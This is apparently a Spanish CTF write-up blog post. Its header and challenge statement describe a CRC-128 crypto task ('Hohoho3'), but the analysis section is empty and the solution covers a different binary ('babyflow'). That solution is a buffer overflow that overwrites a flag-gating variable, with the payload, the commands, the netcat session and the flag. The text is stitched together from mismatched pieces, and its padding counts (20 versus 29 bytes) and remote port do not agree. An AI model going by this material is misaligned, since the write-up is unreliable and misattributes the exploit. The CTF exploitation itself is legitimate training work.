---
title: Hohoho3 - WarGamesCTF2024
author: Kesero
description: Reto Cripto basado en la explotación de Verificación de un CRC-128.
date: 2024-12-30 11:04:00 +0800
categories: [Writeups Competiciones Internacionales, Cripto]
tags: [CRC-128, Medium, Writeups]
pin: false
math: true
mermaid: true
image:
  path: https://github.com/k3sero/Blog_Content/blob/main/Criptografia/Codigos_Practicas/RSA/img/Titulo.png?raw=true
  lqip: 
  alt: 
comments: true
---

Autor del reto: `SKR`

Dificultad: <font color=orange>Medium</font>

## Enunciado

"Santa Claus is coming to town! Send your wishes by connecting to the netcat service!"

## Archivos

Este reto nos da los siguientes archivos.

- `server.py` : Contiene el código que se ejecuta en el servidor.
- `nc 43.216.228.210 32923` : Conexión por netcat al servidor del reto.

Archivos utilizados [aquí]().

## Analizando el código

En este reto 



## Solución


    ┌──(kesero㉿kali)-[~]
    └─$ ./babyflow
    Enter password: SuPeRsEcUrEPaSsWoRd123
    Correct Password!
    Are you sure you are admin? o.O

Para poder llegar a la ejecución del `print` con la flag, tenemos que introducir la contraseña primero y posteriormente entrar dentro del `if`, el cual tiene asociado una variable `local_c`. Si `local_c` es igual a `1`, entonces se ejecutará el contenido.

Por tanto, simplemente con cambiar el valor de `local_c` a `1`, una vez hayamos introducido la contraseña correcta, ya podremos acceder a la ejecución del `print` y obtener la flag, ¿cierto?

Solo hay un pequeño problema y es que en el código del ejecutable no se cambia el valor de `local_c`, por lo que el valor de dicha variable permanece igual en su ejecución y su contenido siempre es `0`.

Llegados a este punto, tenemos que cambiar el valor de dicha variable de manera dinámica, es decir, una vez el programa está en ejecucción. Pero realmente, ¿cómo hacemos esto?

Para conseguir cambiar el valor de la variable `local_c`, tenemos que usar técnicas como **explotación de memoria** o **manipulación de variables en el binario**. 

Vamos a comenzar a realizar un sencillo `Buffer Overflow` ya que podemos observar que la función `fgets` permite leer hasta 50 caracteres (`0x32` en hexadecimal). Sin embargo, el buffer `input` tiene 44 bytes. Esto deja una brecha de 6 bytes a aprovechar para sobreescribir `local_c`. Por lo tanto, tendremos que estructurar un input de manera que la parte adicional después del string correcto, sobreescriba `local_c` en memoria.

Es muy importante aclarar que la variable `local_c` está declarada en memoria inmediatamente después del buffer input. Esto significa que cualquier contenido adicional que sobrepase los 44 bytes del buffer de entrada puede escribir directamente sobre la variable `local_c`.

Por ejemplo un buen input sería el siguiente:

```plaintext
SuPeRsEcUrEPaSsWoRd123AAAAAAAAAAAAAAAAAAAA\x01
```

### NOTA

Para ir probando inputs, lo recomendable es utilizar la consola interactiva de `python` e ir calculando la cantidad necesaria para desbordar el buffer y cambiar el contenido de la variable `local_c`.

```py
python -c 'print("SuPeRsEcUrEPaSsWoRd123" + "A" * 29 + "\x01")' | ./babyflow
```

En este caso:
- `SuPeRsEcUrEPaSsWoRd123` satisface la comparación de contraseña.
- `AAAAAAAAAAAAAAAAAAAA\x01` desbordará el buffer y sobrescribe `local_c` con el valor `0x01`, que se corresponde con el valor `1`.

Al ejecutar el binario, obtenemos lo siguiente.

    ┌──(kesero㉿kali)-[~]
    └─$ ./babyflow

    Enter password: SuPeRsEcUrEPaSsWoRd123AAAAAAAAAAAAAAAAAAAA\x01
    Correct Password!
    INTIGRITI{the_flag_is_different_on_remote}

Listo! Una vez tenemos la flag en local, simplemente tenemos que obtenerla de manera remota. Para esto, como este reto requiere de un payload muy sencillo, no es necesario realizar un script para automatizar el proceso, únicamente con introducir dicha cadena en el servidor, ya obtenemos la flag.

    ┌──(kesero㉿kali)-[~]
    └─$ nc babyflow.ctf.intigriti.io 1331a

    Enter password: SuPeRsEcUrEPaSsWoRd123AAAAAAAAAAAAAAAAAAAA\x01
    Correct Password!
    INTIGRITI{b4bypwn_9cdfb439c7876e703e307864c9167a15}

## Flag

`INTIGRITI{b4bypwn_9cdfb439c7876e703e307864c9167a15}`